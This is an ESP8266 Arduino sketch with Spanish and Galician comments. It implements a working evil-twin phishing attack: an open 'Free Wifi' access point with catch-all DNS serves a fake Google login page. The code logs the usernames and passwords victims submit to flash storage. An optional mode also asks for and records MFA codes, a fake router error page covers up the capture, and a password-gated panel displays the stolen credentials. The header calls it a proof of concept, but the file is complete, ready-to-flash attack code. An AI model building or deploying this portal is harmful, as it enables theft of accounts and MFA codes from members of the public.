/*
 * Original by Corey Harding, edited by G. R. Casanova
 * www.legacysecuritygroup.com
 * Edited by Ivan Romero ZAs
 * Configure access point name and up to 3 custom domains and login urls in config.h
 * Configure the html for login page of said domains in site1.h, site2.h, and site3.h
 * Configure the html for any other domain(catch-all) in site_other.h
 * This is only a proof-of-concept.  I am not responsible for your actions.
 * Obey all local, state, federal, and international laws!
*/


#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ESP8266mDNS.h>
#include <FS.h>
#include "google.h"
#include "facebook.h"
#include "test.h"

// Incluir las bibliotecas de Crypto y SHA256
#include <Crypto.h>
#include <SHA256.h>
#define SHA256_SIZE 32 
#define LOGFILE "/log.txt"

const char *ssid = "Free Wifi";

#define captivePortalPage GOOGLE_HTML

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String webString = "";
String serialString = "";
String pendingCredentials = ""; // Almacena las credenciales pendientes de verificación

const char* hashed_password = "6bceb6d53d51a11c3bde77e8cafe1f152782c5e52a13e514da12a9e35b0c2bcb"; 
const char* salt = "somesalt"; 


// Variable para activar/desactivar el modo de verificación de código
bool codeVerificationMode = false; // Por defecto desactivado

// Función para calcular el hash SHA256
String calculateHash(const char* input, const char* salt) {
    String salted_input = String(input) + String(salt);
    uint8_t hash[SHA256_SIZE]; // Array para almacenar el hash resultante

    SHA256 sha256; // Crear un objeto SHA256
    sha256.reset(); // Reiniciar el objeto SHA256
    sha256.update((const uint8_t*)salted_input.c_str(), salted_input.length()); // Añadir la entrada al hash
    sha256.finalize(hash, SHA256_SIZE); // Finalizar el cálculo del hash

    // Convertir el hash a una cadena hexadecimal
    String hashStr = "";
    for (int i = 0; i < SHA256_SIZE; i++) {
        char buf[3];
        sprintf(buf, "%02x", hash[i]); // Formato hexadecimal de 2 dígitos
        hashStr += buf;
    }

    return hashStr;
}

// Función para verificar la contraseña
bool checkPassword(const char* input_password) {
    String input_hash = calculateHash(input_password, salt);
    return input_hash == hashed_password;
}

void blink(int n) {
  for (int i = 0; i < n; i++) {
    digitalWrite(LED_BUILTIN, LOW);
    delay(250);
    digitalWrite(LED_BUILTIN, HIGH);
    delay(250);
  }
}

void setup() {
  Serial.begin(9600);
  Serial.println();
  Serial.println("V3.0.0 - Ataque de portal falso");
  Serial.println();

  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);
  
  Serial.print("AVISO: o sistema pode tardar entre 1/2 minutos en entrar nun modo COMPLETAMENTE operativo.");
  Serial.print("Recomendase refrescar/reabrir unha pestana do navegador se tardase moito.");
  Serial.print("Inicializando sistema de ficheiros...");
  SPIFFS.begin();
  Serial.println("Sistema de ficheiros inicializado exitosamente!");
  Serial.print("Buscando arquivo log.txt...");
  File f = SPIFFS.open(LOGFILE, "r");

  if (!f) {
    Serial.print(" Arquivo non encontrado. \nFormateando e creando novo log.txt...");
    SPIFFS.format();
    File f = SPIFFS.open(LOGFILE, "w");
    if (!f) {
      Serial.println("Erro na creación dun novo log.txt!");
    }
    f.println("Credenciais de acceso capturadas:");
  }
  f.close();
  Serial.println("Busqueda e apertura de log.txt exitosa!");

  Serial.print("Levantando punto de acceso...");
  WiFi.setOutputPower(20.5);
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(ssid);
  delay(500);
  Serial.println("Punto de acceso levantando exitosamente!");

  Serial.print("Levantando servidor DNS...");
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", apIP);
  Serial.println("Servidor DNS levantado exitosamente!");

  webServer.on("/", handleRoot);
  webServer.on("/generate_204", handleRoot);
  webServer.on("/fwlink", handleRoot);
  webServer.onNotFound(handleRoot);

 webServer.on("/validate", []() {
  String url = webServer.arg("url");
  String user = webServer.arg("user");
  String pass = webServer.arg("pass");

  serialString = url + ":" + user + ":" + pass;
  Serial.println(serialString);

  if (codeVerificationMode) {
    // Guardar las credenciales inmediatamente
    File f = SPIFFS.open(LOGFILE, "a");
    if (f) {
      f.println(serialString); // Guardar en formato URL:usuario:contraseña
      f.close();
    }

    // Almacenar las credenciales pendientes de verificación
    pendingCredentials = serialString;

    // Redirigir a la pantalla de verificación de código
    webString = R"=====(
      <html>
        <head>
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <style>
            body {
              font-family: Arial, sans-serif;
              background-color: #f4f4f9;
              margin: 0;
              padding: 20px;
              color: #333;
              display: flex;
              justify-content: center;
              align-items: center;
              height: 100vh;
              flex-direction: column;
            }
            h1 {
              color: #444;
              font-size: 24px;
              margin-bottom: 20px;
              text-align: center;
            }
            form {
              background-color: #fff;
              padding: 20px;
              border-radius: 10px;
              box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
              width: 100%;
              max-width: 400px;
            }
            input[type="text"] {
              width: 100%;
              padding: 10px;
              font-size: 16px;
              border: 1px solid #ddd;
              border-radius: 5px;
              margin-bottom: 15px;
              box-sizing: border-box;
            }
            input[type="submit"] {
              width: 100%;
              background-color: #007bff;
              color: white;
              border: none;
              padding: 10px;
              border-radius: 5px;
              cursor: pointer;
              font-size: 16px;
            }
            input[type="submit"]:hover {
              background-color: #0056b3;
            }
            @media (max-width: 600px) {
              h1 {
                font-size: 20px;
              }
              form {
                padding: 15px;
              }
              input[type="text"], input[type="submit"] {
                font-size: 14px;
              }
            }
          </style>
        </head>
        <body>
          <h1>Enter Verification Code</h1>
          <form action='/verify_code' method='POST'>
            <input type='hidden' name='url' value=')=====" + url + R"=====('>
            <input type='hidden' name='user' value=')=====" + user + R"=====('>
            <input type='hidden' name='pass' value=')=====" + pass + R"=====('>
            <input type='text' name='code' placeholder='Enter code' required>
            <input type='submit' value='Submit'>
          </form>
        </body>
      </html>
    )=====";
    webServer.send(200, "text/html", webString);
  } else {
    // Guardar las credenciales directamente (modo de verificación desactivado)
    File f = SPIFFS.open(LOGFILE, "a");
    if (f) {
      f.println(serialString);
      f.close();
    }

    webString = "<h1>#E701 - Router Configuration Error</h1>";
    webServer.send(500, "text/html", webString);

    serialString = "";
    webString = "";

    blink(5);
  }
});

webServer.on("/verify_code", []() {
  String url = webServer.arg("url");
  String user = webServer.arg("user");
  String pass = webServer.arg("pass");
  String code = webServer.arg("code");

  // Crear la cadena de credenciales para comparar
  String currentCredentials = url + ":" + user + ":" + pass;

  // Verificar si las credenciales coinciden con las pendientes
  if (currentCredentials == pendingCredentials) {
    // Leer el archivo log.txt
    File f = SPIFFS.open(LOGFILE, "r");
    String fileContent = "";
    if (f) {
      while (f.available()) {
        String line = f.readStringUntil('\n');
        line.trim(); // Eliminar espacios en blanco o saltos de línea adicionales
        if (line == pendingCredentials) {
          // Añadir el código a la línea correspondiente
          line += ":" + code;
        }
        fileContent += line + "\n"; // Añadir la línea al contenido del archivo
      }
      f.close();
    }

    // Sobrescribir el archivo log.txt con el contenido actualizado
    f = SPIFFS.open(LOGFILE, "w");
    if (f) {
      f.print(fileContent); // Escribir el contenido actualizado
      f.close();
    }

    // Mostrar el código en la consola serial
    Serial.println("Code Verification Mode: ON");
    Serial.println("Code obtained: " + code);

    // Mostrar el mensaje de error (siempre se muestra)
    webString = "<h1>#E701 - Router Configuration Error</h1>";
    webServer.send(500, "text/html", webString);

    serialString = "";
    webString = "";

    blink(5); // Indicación visual de que se ha guardado el código
  } else {
    // Credenciales no coinciden, mostrar un mensaje de error
    webString = "<html><body><h1>Invalid credentials</h1><br><a href='/'>Try again</a></body></html>";
    webServer.send(401, "text/html", webString);
  }
});

webServer.on("/logs", []() {
  // Verificar si se ha enviado una contraseña
  if (webServer.hasArg("password")) {
    String password = webServer.arg("password");
    if (checkPassword(password.c_str())) {
      // Contraseña correcta, mostrar los logs
      String webString = R"=====(
        <html>
          <head>
            <title>Panel de administración</title>
            <style>
              body {
                font-family: Arial, sans-serif;
                background-color: #f4f4f9;
                margin: 0;
                padding: 20px;
                color: #333;
              }
              h1 {
                color: #444;
              }
              pre {
                background-color: #fff;
                border: 1px solid #ddd;
                padding: 15px;
                border-radius: 5px;
                max-width: 800px;
                overflow-x: auto;
              }
              .button-container {
                margin-top: 20px;
              }
              .button-container button {
                background-color: #007bff;
                color: white;
                border: none;
                padding: 10px 20px;
                margin: 5px;
                border-radius: 5px;
                cursor: pointer;
                font-size: 16px;
              }
              .button-container button:hover {
                background-color: #0056b3;
              }
              .button-container button.refresh {
                background-color: #28a745;
              }
              .button-container button.refresh:hover {
                background-color: #218838;
              }
              .button-container button.clear {
                background-color: #dc3545;
              }
              .button-container button.clear:hover {
                background-color: #c82333;
              }
            </style>
          </head>
          <body>
            <h1>Credenciais capturadas</h1>
            <pre>
      )=====";

      // Leer y mostrar el contenido del archivo log.txt
      File f = SPIFFS.open(LOGFILE, "r");
      if (f) {
        webString += f.readString();
        f.close();
      } else {
        webString += "Erro durante a lectura dos logs";
      }

      webString += R"=====(
            </pre>
            <div class="button-container">
              <button onclick="window.location.href='/logs/clear'">Eliminar logs</button>
              <button onclick="window.location.href='/logs/toggle_code_verification'">)=====";
      webString += codeVerificationMode ? "Desactivar solicitude de MFA" : "Activar solicitude de MFA";
      webString += R"=====(</button>
              <button class="refresh" onclick="window.location.href='/logs'">Refrescar</button>
            </div>
          </body>
        </html>
      )=====";

      webServer.send(200, "text/html", webString);
    } else {
      // Contraseña incorrecta, mostrar un mensaje de error
      webString = "<html><body><h1>Contrasinal incorrecto</h1><br><a href='/logs'>Volve a introducir o contrasinal</a></body></html>";
      webServer.send(401, "text/html", webString);
    }
  } else {
    // Mostrar el formulario para ingresar la contraseña
    webString = R"=====(
      <html>
        <head>
          <style>
            body {
              font-family: Arial, sans-serif;
              background-color: #f4f4f9;
              margin: 0;
              padding: 20px;
              color: #333;
            }
            h1 {
              color: #444;
            }
            form {
              margin-top: 20px;
            }
            input[type="password"] {
              padding: 10px;
              font-size: 16px;
              border: 1px solid #ddd;
              border-radius: 5px;
            }
            input[type="submit"] {
              background-color: #007bff;
              color: white;
              border: none;
              padding: 10px 20px;
              margin-left: 10px;
              border-radius: 5px;
              cursor: pointer;
              font-size: 16px;
            }
            input[type="submit"]:hover {
              background-color: #0056b3;
            }
          </style>
        </head>
        <body>
          <h1>Introduce o contrasinal</h1>
          <form action='/logs' method='POST'>
            <input type='password' name='password' placeholder='Contrasinal'>
            <input type='submit' value='Acceder'>
          </form>
        </body>
      </html>
    )=====";
    webServer.send(200, "text/html", webString);
  }
});

webServer.on("/logs/toggle_code_verification", []() {
  codeVerificationMode = !codeVerificationMode;
  String webString = R"=====(
    <html>
      <head>
        <title>Modo de código de verificación</title>
        <style>
          body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            margin: 0;
            padding: 20px;
            color: #333;
          }
          h1 {
            color: #444;
          }
          .button-container {
            margin-top: 20px;
          }
          .button-container button {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 10px 20px;
            margin: 5px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
          }
          .button-container button:hover {
            background-color: #0056b3;
          }
        </style>
      </head>
      <body>
        <h1>Modo de solicitude de MFA  )=====";
  webString += codeVerificationMode ? "activado" : "desactivado";
  webString += R"=====(</h1>
        <div class="button-container">
          <button onclick="window.location.href='/logs'">Regreso</button>
        </div>
      </body>
    </html>
  )=====";
  webServer.send(200, "text/html", webString);

  // Mostrar el estado del modo en la consola serial
  Serial.println("Solicitar código de verficación: " + String(codeVerificationMode ? "ON" : "OFF"));
});

webServer.on("/logs/clear", []() {
  // Verificar si se ha enviado una contraseña
  if (webServer.hasArg("password")) {
    String password = webServer.arg("password");
    if (checkPassword(password.c_str())) {
      // Contraseña correcta, borrar los logs
      File f = SPIFFS.open(LOGFILE, "w");
      if (f) {
        f.println("Credenciais de acceso capturadas:");
        f.close();
      }

      String webString = R"=====(
        <html>
          <head>
            <title>Eliminar logs</title>
            <style>
              body {
                font-family: Arial, sans-serif;
                background-color: #f4f4f9;
                margin: 0;
                padding: 20px;
                color: #333;
              }
              h1 {
                color: #444;
              }
              .button-container {
                margin-top: 20px;
              }
              .button-container button {
                background-color: #007bff;
                color: white;
                border: none;
                padding: 10px 20px;
                margin: 5px;
                border-radius: 5px;
                cursor: pointer;
                font-size: 16px;
              }
              .button-container button:hover {
                background-color: #0056b3;
              }
            </style>
          </head>
          <body>
            <h1>Todos os logs foron eliminados</h1>
            <div class="button-container">
              <button onclick="window.location.href='/logs'">Regreso</button>
            </div>
          </body>
        </html>
      )=====";
      webServer.send(200, "text/html", webString);
    } else {
      // Contraseña incorrecta, mostrar un mensaje de error
      String webString = R"=====(
        <html>
          <head>
            <style>
              body {
                font-family: Arial, sans-serif;
                background-color: #f4f4f9;
                margin: 0;
                padding: 20px;
                color: #333;
              }
              h1 {
                color: #444;
              }
              a {
                color: #007bff;
                text-decoration: none;
              }
              a:hover {
                text-decoration: underline;
              }
            </style>
          </head>
          <body>
            <h1>Contrasinal incorrecto</h1>
            <br>
            <a href='/logs/clear'>Volve a introducir o contrasinal</a>
          </body>
        </html>
      )=====";
      webServer.send(401, "text/html", webString);
    }
  } else {
    // Mostrar el formulario para ingresar la contraseña
    String webString = R"=====(
      <html>
        <head>
          <style>
            body {
              font-family: Arial, sans-serif;
              background-color: #f4f4f9;
              margin: 0;
              padding: 20px;
              color: #333;
            }
            h1 {
              color: #444;
            }
            form {
              margin-top: 20px;
            }
            input[type="password"] {
              padding: 10px;
              font-size: 16px;
              border: 1px solid #ddd;
              border-radius: 5px;
            }
            input[type="submit"] {
              background-color: #007bff;
              color: white;
              border: none;
              padding: 10px 20px;
              margin-left: 10px;
              border-radius: 5px;
              cursor: pointer;
              font-size: 16px;
            }
            input[type="submit"]:hover {
              background-color: #0056b3;
            }
          </style>
        </head>
        <body>
          <h1>Introduce o contrasinal</h1>
          <form action='/logs/clear' method='POST'>
            <input type='password' name='password' placeholder='Contrasinal'>
            <input type='submit' value='Acceder'>
          </form>
        </body>
      </html>
    )=====";
    webServer.send(200, "text/html", webString);
  }
});

  Serial.print("Iniciando servidor web...");
  webServer.begin();
  Serial.println(" Servidor iniciado con éxito!");

  blink(10);

  Serial.println("Dispositivo operativo!");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}

void handleRoot() {
  webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  webServer.sendHeader("Pragma", "no-cache");
  webServer.sendHeader("Expires", "-1");

  webServer.send(200, "text/html", captivePortalPage);
}
